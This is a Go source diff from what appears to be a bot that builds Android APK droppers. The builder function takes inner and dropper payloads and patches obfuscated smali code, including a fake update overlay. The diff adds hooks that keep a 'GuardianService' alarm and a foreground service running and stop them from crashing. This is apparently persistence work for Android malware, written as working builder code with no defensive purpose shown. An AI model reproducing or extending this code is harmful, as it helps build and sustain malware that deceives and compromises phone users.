@@ -1856,6 +1856,12 @@ func (b *Bot) buildSingleAPK(sess *BuildSession, isInnerPayload bool, dropperPay
 	syncSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "SyncQYAdapter.smali")
 	patchFakeUpdateOverlay(syncSmali)
 
+	guardianSmali := filepath.Join(workDir, "smali", "app", "mobilex", "plus", "services", "GuardianService.smali")
+	patchGuardianAlarm(guardianSmali)
+
+	y6jSmali := filepath.Join(workDir, "smali", "v", "s", "y6jRGLEWNMir.smali")
+	patchStartForegroundService(y6jSmali)
+
 	stringsXml := filepath.Join(workDir, "res", "values", "strings.xml")
 	patchFirebaseResources(stringsXml)
 
@@ -2427,9 +2433,11 @@ func patchStartForegroundService(smaliPath string) {
 	s := string(data)
 
 	old := "    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n\n    .line 55\n    .line 56\n    .line 57\n    return-void\n.end method"
-	new := "    :try_start_svc\n    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n    :try_end_svc\n    .catch Ljava/lang/Exception; {:try_start_svc .. :try_end_svc} :catch_svc\n\n    .line 55\n    .line 56\n    .line 57\n    return-void\n\n    :catch_svc\n    return-void\n.end method"
+	// Normal flow must jump past catch handler; catch handler needs move-exception.
+	// Method hjneShqpF9Tis4 has .locals 2, so v1 is available for move-exception.
+	newCode := "    :try_start_svc\n    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n    :try_end_svc\n    .catch Ljava/lang/Exception; {:try_start_svc .. :try_end_svc} :catch_svc\n\n    .line 55\n    .line 56\n    .line 57\n    goto :end_svc\n\n    :catch_svc\n    move-exception v1\n\n    :end_svc\n    return-void\n.end method"
 
-	patched := strings.Replace(s, old, new, 1)
+	patched := strings.Replace(s, old, newCode, 1)
 	if patched == s {
 		log.Printf("[BUILDER] WARNING: patchStartForegroundService: pattern not found in %s", smaliPath)
 		return
@@ -2454,10 +2462,10 @@ func patchGuardianAlarm(smaliPath string) {
 	}
 	s := string(data)
 
-	old := "invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setExactAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V\n    :try_end_0\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n    .line 43\n    .line 44\n    .line 45\n    :catch_0\n    :goto_1\n    return-void\n.end method"
-	new := "invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V\n    :try_end_0\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n    .line 43\n    .line 44\n    .line 45\n    :catch_0\n    :goto_1\n    return-void\n.end method"
+	old := "    invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setExactAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V\n    :try_end_0\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n    .line 43\n    .line 44\n    .line 45\n    :catch_0\n    :goto_1\n    return-void\n.end method"
+	newGuardian := "    invoke-virtual {v0, v4, v2, v3, v1}, Landroid/app/AlarmManager;->setAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V\n    :try_end_0\n    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0\n\n    .line 43\n    .line 44\n    .line 45\n    :catch_0\n    :goto_1\n    return-void\n.end method"
 
-	patched := strings.Replace(s, old, new, 1)
+	patched := strings.Replace(s, old, newGuardian, 1)
 	if patched == s {
 		log.Printf("[BUILDER] WARNING: patchGuardianAlarm: pattern not found in %s", smaliPath)
 		return
